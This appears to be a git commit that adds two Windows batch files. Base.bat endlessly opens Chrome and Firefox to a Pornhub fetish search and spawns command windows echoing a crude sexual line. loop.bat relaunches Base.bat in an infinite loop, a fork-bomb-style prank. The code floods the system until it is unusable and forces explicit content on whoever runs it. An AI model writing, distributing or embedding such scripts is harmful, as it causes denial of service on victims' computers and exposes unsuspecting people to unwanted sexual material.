e4f6a9d2bd3aff9d6cf2f38e8eb6cd8d37b2dd4f
B0OBS <jacktureconw@gmail.com>
2025-01-09 20:37:27 -0600

    Add files via upload

---
+++ Base.bat
@@ -0,0 +1,6 @@
+@echo off
+:a
+start chrome www.pornhub.com/video/seach?search=fart+fetish
+start firefox www.pornhub.com/video/seach?search=fart+fetish
+start cmd /k echo "UBGHHHHHHH IM CUMMMMMING" /f
+goto a
---
+++ loop.bat
@@ -0,0 +1,5 @@
+@echo off
+:a
+set "filePath=%~dp0Base.bat"
+start "" "%filePath%"
+goto a
